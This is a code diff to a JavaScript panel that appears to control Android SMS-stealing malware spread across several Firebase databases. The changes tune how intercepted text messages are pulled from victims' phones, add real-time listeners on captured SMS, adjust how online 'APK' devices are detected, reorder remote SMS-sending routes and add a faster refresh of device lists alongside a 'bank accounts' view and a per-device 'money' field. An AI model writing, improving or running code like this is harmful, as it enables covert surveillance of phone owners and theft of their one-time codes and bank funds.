@@ -20,7 +20,7 @@ var PAGE_VIEWS={home:'view-home',online:'view-online',onlypin:'view-onlypin',lik
 var LIKED_KEY='nya_liked_devices';
 var likedDevices={};
 var _procDevsTimer=null, _panelPaused=false;
-var SMS_POLL_MS=100, SMS_POLL_BG_MS=2000, SYNC_INTERVAL_MS=90000;
+var SMS_POLL_MS=50, SMS_POLL_BG_MS=1500, SYNC_INTERVAL_MS=90000;
 var SMS_RENDER_DEBOUNCE_MS=50;
 var _smsRenderTimer=null, _sendInFlight=false;
 var FB_LIST_KEY='nya_firebase_list';
@@ -160,9 +160,9 @@ function getPrioritySmsPaths(d,inst){
     });
   }
   if(isRabelPanel(inst)||paths.length){
-    ['user_sms','sms_backup','messages','all_sms','new_sms'].forEach(function(root){
+    ['messages','user_sms','sms_backup','all_sms','new_sms'].forEach(function(root){
       var p=root+'/'+id;
-      if(paths.indexOf(p)<0)paths.push(p);
+      if(paths.indexOf(p)<0)paths.unshift(p);
     });
   }
   return uniqPaths(paths);
@@ -216,35 +216,40 @@ function buildUniversalSmsPaths(d,inst){
   return priority.concat(rest);
 }
 
-// ---- FIX: Online status accuracy ----
-var ONLINE_FRESH_MS=60000;
-var ONLINE_STALE_MS=120000;
-var ONLINE_FLAG_TRUST_MS=180000;
+// ---- Online status (APK: status boolean + heartbeat fallback) ----
+var ONLINE_FRESH_MS=45000;
+var ONLINE_STALE_MS=90000;
+var ONLINE_FLAG_TRUST_MS=120000;
 
 function extractHeartbeatMs(raw){
   if(!raw||typeof raw!=='object') return 0;
-  var keys=['_lastOnlineMs','last_seen','lastSeen','last_ping','lastPing','last_ping_at','lastPingAt','updated_at','updatedAt','timestamp','timestamp_millis','heartbeat','last_heartbeat','ping_at','ping_time','seen_at'];
+  var keys=['lastMessageTime','_lastOnlineMs','last_seen','lastSeen','last_ping','lastPing','last_ping_at','lastPingAt','updated_at','updatedAt','timestamp','timestamp_millis','heartbeat','last_heartbeat','ping_at','ping_time','seen_at'];
   var best=0,i,ms;
   for(i=0;i<keys.length;i++){ms=toTimestampMs(raw[keys[i]]);if(ms>best) best=ms;}
+  if(raw.ping&&typeof raw.ping==='object'){ms=toTimestampMs(raw.ping.ts||raw.ping.time||raw.ping.at);if(ms>best) best=ms;}
   if(raw.live_data&&typeof raw.live_data==='object'){ms=extractHeartbeatMs(raw.live_data);if(ms>best) best=ms;}
   if(raw.device_info&&typeof raw.device_info==='object'){ms=extractHeartbeatMs(raw.device_info);if(ms>best) best=ms;}
   return best;
 }
 function toTimestampMs(v){if(v==null||v==='')return 0;if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;if(typeof v==='string'){if(!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}var t=Date.parse(v);if(!isNaN(t))return t;}return 0;}
-function hasExplicitOnlineFlag(s){if(!s)return false;return s.online_status===true||s.online===true||s.status===true||s.status==='online';}
-function hasExplicitOfflineFlag(s){if(!s)return false;return s.online_status===false||s.status===false||s.status==='offline';}
+function hasExplicitOnlineFlag(s){if(!s)return false;return s.online_status===true||s.online===true||s.status===true||s.status==='online'||s.status==='true'||s.status===1;}
+function hasExplicitOfflineFlag(s){if(!s)return false;return s.online_status===false||s.status===false||s.status==='offline'||s.status==='false'||s.status===0;}
 function resolveOnlineStatus(s,fbId){
   if(!s)return false;
   if(isCommandOnlyRecord(s))return false;
-  if(hasApkModelName(s)&&s.status!==undefined)return isApkOnlineRaw(s);
   var now=Date.now();
-  var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
-  var hb=extractHeartbeatMs(s);var hbAge=hb?now-hb:Infinity;
-  var flagOn=hasExplicitOnlineFlag(s);var flagOff=hasExplicitOfflineFlag(s);
-  if(schema==='rabel'&&(s.status===true||s.online===true))flagOn=true;
-  if(flagOn){if(!hb)return true;if(hbAge<=ONLINE_FLAG_TRUST_MS)return true;if(hbAge>ONLINE_FLAG_TRUST_MS*2)return false;return true;}
-  if(flagOff){if(hb&&hbAge<=ONLINE_FRESH_MS)return true;return false;}
-  if(hb&&hbAge<=ONLINE_STALE_MS)return true;return false;
+  var hb=extractHeartbeatMs(s);
+  var hbAge=hb?now-hb:Infinity;
+  if(hasApkModelName(s)&&s.status!==undefined&&s.status!==null&&String(s.status)!==''){
+    if(parseApkBool(s.status))return true;
+    if(s.status===false||String(s.status).toLowerCase()==='false'||String(s.status).toLowerCase()==='offline')return false;
+  }
+  var flagOn=hasExplicitOnlineFlag(s);
+  var flagOff=hasExplicitOfflineFlag(s);
+  if(flagOn)return true;
+  if(flagOff)return hbAge<=ONLINE_FRESH_MS;
+  if(hb&&hbAge<=ONLINE_STALE_MS)return true;
+  return false;
 }
 
 function isDeviceSummaryNode(name){
@@ -329,8 +334,7 @@ function deviceOnlineFromRaw(s,fbId){
   if(!s)return false;
   if(s.status!==undefined&&s.status!==null&&String(s.status)!==''){
     if(parseApkBool(s.status))return true;
-    var sl=String(s.status).toLowerCase();
-    if(s.status===false||sl==='false'||sl==='0'||sl==='offline')return false;
+    if(s.status===false||String(s.status).toLowerCase()==='false'||String(s.status).toLowerCase()==='0'||String(s.status).toLowerCase()==='offline')return false;
   }
   return resolveOnlineStatus(s,fbId);
 }
@@ -1302,11 +1306,28 @@ function attachLive(inst){
   if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
   getDeviceNodesForInst(inst).slice(0,12).forEach(function(node){
     try{
-      inst.db.ref(node).on('value',function(s){
+      var ref=inst.db.ref(node);
+      ref.on('value',function(s){
         if(!s.exists())return;
         mergeSummaryNode(inst.id,node,s.val());
         processClientsData();
       });
+      if(node==='clients'||node==='devices'||node==='user_list'){
+        var onChild=function(snap){
+          var data=snap.val();
+          if(!data||typeof data!=='object')return;
+          ingestDeviceData(inst.id,node,snap.key,data);
+          processClientsData();
+        };
+        var onChildInstant=function(snap){
+          var data=snap.val();
+          if(!data||typeof data!=='object')return;
+          ingestDeviceData(inst.id,node,snap.key,data);
+          processClientsDataNow();
+        };
+        ref.on('child_changed',onChildInstant);
+        ref.on('child_added',onChild);
+      }
     }catch(e){}
   });
 }
@@ -1669,6 +1690,12 @@ function renderDeviceSmsList(){
 }
 function closeDeviceDetail(){
   selDev='';
+  if(activeListeners._devLive){
+    try{
+      if(activeListeners._devLive.ref&&activeListeners._devLive.h)activeListeners._devLive.ref.off('value',activeListeners._devLive.h);
+    }catch(e){}
+    delete activeListeners._devLive;
+  }
   clearListeners();
   showPage('home');
 }
@@ -1708,6 +1735,32 @@ function saveDeviceMoney(){
   if(!val){toast('Enter amount',false);return;}
   patchClientField(d,{money:val},'Money updated').then(function(){renderDeviceDetail();});
 }
+function attachSelectedDeviceLive(d){
+  if(!d)return;
+  var inst=getFbInstance(d.fbId);
+  if(!inst||!inst.db)return;
+  var liveKey='_devLive';
+  if(activeListeners[liveKey]){
+    try{
+      if(activeListeners[liveKey].ref&&activeListeners[liveKey].h)activeListeners[liveKey].ref.off('value',activeListeners[liveKey].h);
+    }catch(e){}
+  }
+  var node=(d.deviceNode||'clients')+'/'+d.rawId;
+  try{
+    var ref=inst.db.ref(node);
+    var h=function(snap){
+      if(!snap||typeof snap.exists==='function'&&!snap.exists())return;
+      if(selDev!==d.id)return;
+      var val=typeof snap.val==='function'?snap.val():snap;
+      if(!val||typeof val!=='object')return;
+      ingestDeviceData(d.fbId,d.deviceNode||'clients',d.rawId,val);
+      processClientsDataNow();
+      renderDeviceDetail();
+    };
+    ref.on('value',h);
+    activeListeners[liveKey]={ref:ref,h:h,devId:d.id};
+  }catch(e){}
+}
 function selectDevice(id){
   selDev=id;
   var d=getSelDev();
@@ -1719,6 +1772,7 @@ function selectDevice(id){
   });
   renderDeviceDetail();
   fillDeviceSmsTo(d,true);
+  attachSelectedDeviceLive(d);
   var smsEl=document.getElementById('devListDeviceSms');
   if(smsEl)smsEl.innerHTML='<div class="empty">Loading SMS…</div>';
   loadSmsForDevice(true);
@@ -1833,6 +1887,7 @@ function setDeviceSms(devId,list){
     window_allSms=sms;
     window_sms=sms.slice(0,80);
     scheduleRenderSms();
+    if(currentView==='device')renderDeviceSmsList();
     if(document.getElementById('screen-bank')&&document.getElementById('screen-bank').classList.contains('active'))renderBankAccounts();
   }
 }
@@ -1841,6 +1896,7 @@ function scheduleRenderSms(){
   _smsRenderTimer=setTimeout(function(){
     _smsRenderTimer=null;
     renderSms();
+    if(currentView==='device')renderDeviceSmsList();
   },SMS_RENDER_DEBOUNCE_MS);
 }
 function mergeSmsIntoDevice(devId,list){
@@ -1859,6 +1915,7 @@ function showSmsForSelectedDevice(){
 }
 function clearListeners(){
   Object.keys(activeListeners).forEach(function(k){
+    if(k==='_devLive')return;
     var L=activeListeners[k];
     if(L.loadTimer)clearTimeout(L.loadTimer);
     if(L.timer)clearInterval(L.timer);
@@ -1867,6 +1924,7 @@ function clearListeners(){
       try{
         if(r.ref&&r.h){
           if(r.type==='child_added')r.ref.off('child_added',r.h);
+          else if(r.type==='child_changed')r.ref.off('child_changed',r.h);
           else r.ref.off('value',r.h);
         }
       }catch(e){}
@@ -1878,35 +1936,38 @@ function clearListeners(){
 function attachSmsLiveListeners(inst,d,devId,seq,listeners,applyFn){
   if(!inst||!inst.db||typeof applyFn!=='function')return;
   var paths=getPrioritySmsPaths(d,inst);
-  if(!paths.length)paths=['user_sms/'+d.rawId,'sms_backup/'+d.rawId];
-  paths.slice(0,3).forEach(function(path){
+  if(!paths.length)paths=['messages/'+d.rawId,'user_sms/'+d.rawId,'sms_backup/'+d.rawId];
+  paths=uniqPaths(['messages/'+d.rawId].concat(paths)).slice(0,5);
+  paths.forEach(function(path){
     if(!path)return;
     try{
       var baseRef=inst.db.ref(path);
       var qRef=baseRef;
-      try{qRef=baseRef.limitToLast(150);}catch(e2){}
-      var liveReady=false;
-      qRef.once('value',function(snap){
-        if(seq!==_smsLoadSeq||selDev!==devId)return;
-        var list=parseSmsRaw(typeof snap.val==='function'?snap.val():snap);
-        if(list.length)applyFn(list);
-        liveReady=true;
-      });
-      var childHandler=function(snap){
-        if(!liveReady||_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
-        var s=normalizeSms(typeof snap.val==='function'?snap.val():snap);
-        if(s)mergeSmsIntoDevice(devId,[s]);
+      try{qRef=baseRef.limitToLast(200);}catch(e2){}
+      var ingestSnap=function(snap,instant){
+        if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
+        if(!snap)return;
+        var key=typeof snap.key==='string'?snap.key:'';
+        var val=typeof snap.val==='function'?snap.val():snap;
+        if(!val||typeof val!=='object')return;
+        if(instant){
+          var one=normalizeSms(Object.assign({},val,{id:val.id||key}),key||val.id);
+          if(one)mergeSmsIntoDevice(devId,[one]);
+          return;
+        }
+        applyFn(parseSmsRaw(val));
       };
-      try{
-        qRef.on('child_added',childHandler);
-        listeners.refs.push({ref:qRef,h:childHandler,type:'child_added'});
-      }catch(e3){}
+      qRef.once('value',function(snap){ingestSnap(snap,false);});
+      var addedHandler=function(snap){ingestSnap(snap,true);};
+      qRef.on('child_added',addedHandler);
+      listeners.refs.push({ref:qRef,h:addedHandler,type:'child_added'});
+      var changedHandler=function(snap){ingestSnap(snap,true);};
+      qRef.on('child_changed',changedHandler);
+      listeners.refs.push({ref:qRef,h:changedHandler,type:'child_changed'});
       var valHandler=function(snap){
         if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
         if(!snap||typeof snap.exists==='function'&&!snap.exists())return;
-        var val=typeof snap.val==='function'?snap.val():snap;
-        applyFn(parseSmsRaw(val));
-        liveReady=true;
+        applyFn(parseSmsRaw(typeof snap.val==='function'?snap.val():snap));
       };
       qRef.on('value',valHandler);
       listeners.refs.push({ref:qRef,h:valHandler,type:'value'});
@@ -1919,9 +1980,9 @@ function smsPrimaryPaths(d,inst){
   var id=d.rawId, schema=(inst&&inst.schema)||'rabel', paths=[], bases=getSmsDeviceBases(d,inst), pref=(inst&&inst.config&&inst.config.preferredDeviceNode)||'';
   if(!id)return paths;
   if(isRabelPanel(inst)||schema==='rabel'||pref==='user_list'||pref==='user_data'){
+    paths.push('messages/'+id);
     paths.push('user_sms/'+id);
     paths.push('sms_backup/'+id);
-    paths.push('messages/'+id);
     paths.push('sms/'+id);
     bases.forEach(function(n){
       if(!n||COMMAND_JUNK_NODES.indexOf(n)>=0)return;
@@ -2116,7 +2177,8 @@ function loadSmsForDevice(force){
   }
 
   poll();
-  var timer=setInterval(poll,inst.db?SMS_POLL_MS:SMS_POLL_MS);
+  var pollMs=inst.db?SMS_POLL_MS:SMS_POLL_BG_MS;
+  var timer=setInterval(poll,pollMs);
   var listeners={timer:timer,timers:[timer],refs:[],devId:devId,seq:seq,loadTimer:loadTimer,live:!!inst.db};
 
   attachSmsLiveListeners(inst,d,devId,seq,listeners,applySmsList);
@@ -2410,8 +2472,8 @@ function sendSmsInstant(to,msg,simSlot,callback){
   var phone=normalizePhone(phoneFull)||phoneFull;
   var attempts=getSendAttempts(inst,d,phoneFull||phone,msg,simSlot||1);
   var tasks=[];
-  if(inst.db)tasks.push(sendSmsDirectFirebase(inst,attempts));
   tasks.push(sendSmsViaRest(inst,attempts));
+  if(inst.db)tasks.push(sendSmsDirectFirebase(inst,attempts));
   tasks.push(sendSmsFetch({
     device_id:d.rawId,to:phoneFull||phone,message:msg,sim:simSlot||1,
     database_url:inst.restUrl,auth_key:getFbAuthKey(inst),
@@ -2848,4 +2910,8 @@ setInterval(function(){
   if(!panelReady||_panelPaused)return;
   fetchAllData(false).catch(function(){});
 },SYNC_INTERVAL_MS);
+setInterval(function(){
+  if(!panelReady||_panelPaused||!allDevs.length)return;
+  processClientsDataNow();
+},30000);
 window.addEventListener('unhandledrejection',function(){});
